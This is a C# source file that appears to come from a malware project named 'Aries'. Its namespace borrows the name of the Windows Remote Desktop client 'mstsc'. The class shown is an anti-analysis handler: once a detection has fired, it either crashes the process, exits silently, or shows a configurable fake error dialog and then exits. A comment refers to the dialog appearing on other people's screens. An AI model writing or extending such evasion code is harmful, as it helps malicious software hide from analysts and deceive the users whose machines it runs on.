using System;

namespace mstsc.Aries.Antis
{
sealed class AntiFound
    {
        public AntiFound()
        {
            if (System.IO.File.Exists(Aries.Config.TemporaryFilesPath + Aries.Config.File))
            {
                Environment.Exit(-1);
            }
            switch (Config.Settings[1])
            {
                case "0":
                    Environment.FailFast(new Random().Next(1, 1000).ToString());
                    break;
                case "1":
                    Util.AntiThread.Abort();//kill it so you won't end up with a hundred messageboxes 
                    //going across someones screen if they were afk & it keeps detecting something
                    Config AntiConfig = new Config();
                    System.Windows.Forms.MessageBox.Show(
                        AntiConfig.Anti(Config.AntiType.ErrorBody),
                        AntiConfig.Anti(Config.AntiType.ErrorTitle),
                        System.Windows.Forms.MessageBoxButtons.OK,
                        new Config.Settings_().GetIcon);
                    Environment.Exit(-1);
                    break;
                case "2":
                    Environment.Exit(-1);
                    break;
                default:
                    Environment.Exit(-1);
                    break;
            }
        }
    }
}
